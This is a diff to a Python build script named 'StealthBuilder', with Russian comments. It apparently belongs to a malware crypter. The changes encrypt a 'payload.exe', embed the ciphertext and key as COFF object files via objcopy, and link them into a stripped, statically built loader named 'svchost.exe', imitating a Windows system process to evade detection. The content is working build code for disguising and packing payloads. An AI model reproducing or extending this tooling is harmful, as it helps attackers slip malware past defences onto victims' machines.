@@ -1,4 +1,4 @@
-# build.py - БЫСТРАЯ СБОРКА (без DLL конвертации)
+# build.py - БЫСТРАЯ СБОРКА с objcopy
 import os
 import sys
 import subprocess
@@ -65,7 +65,7 @@ class StealthBuilder:
         return "payload.exe"
     
     def encrypt_and_build(self, exe_path):
-        """Шифрует EXE и создает загрузчик (БЕЗ DLL)"""
+        """Шифрует EXE и создает загрузчик"""
         print("[+] Encrypting EXE...")
         
         with open(exe_path, 'rb') as f:
@@ -89,6 +89,37 @@ class StealthBuilder:
         
         size_mb = len(encrypted) / (1024*1024)
         print(f"[+] Encrypted! Size: {size_mb:.1f} MB")
+        
+        # Конвертируем бинарные файлы в объектные через objcopy
+        print("[+] Converting to object files with objcopy...")
+        
+        # encrypted.bin → encrypted.o
+        cmd = [
+            'objcopy',
+            '-I', 'binary',
+            '-O', 'coff-i386',  # 32-bit COFF
+            '--rename-section', '.data=.rdata,readonly,contents,alloc,load,data',
+            'encrypted.bin',
+            'encrypted.o'
+        ]
+        result = subprocess.run(cmd, capture_output=True)
+        if result.returncode != 0:
+            print(f"[-] objcopy error (encrypted): {result.stderr.decode()}")
+            # Пробуем без опций
+            cmd = ['objcopy', '-I', 'binary', '-O', 'coff-i386', 'encrypted.bin', 'encrypted.o']
+            result = subprocess.run(cmd, capture_output=True)
+            if result.returncode != 0:
+                print(f"[-] objcopy error: {result.stderr.decode()}")
+                return None
+        
+        # key.bin → key.o
+        cmd = ['objcopy', '-I', 'binary', '-O', 'coff-i386', 'key.bin', 'key.o']
+        result = subprocess.run(cmd, capture_output=True)
+        if result.returncode != 0:
+            print(f"[-] objcopy error (key): {result.stderr.decode()}")
+            return None
+        
+        print("[+] Object files created!")
         
         # Создаем загрузчик
         print("[+] Creating loader...")
@@ -179,8 +210,8 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
             'g++',
             '-o', 'svchost.exe',
             loader_path,
-            'encrypted.bin',
-            'key.bin',
+            'encrypted.o',  # ← Объектный файл!
+            'key.o',        # ← Объектный файл!
             '-static',
             '-s',
             '-O1',
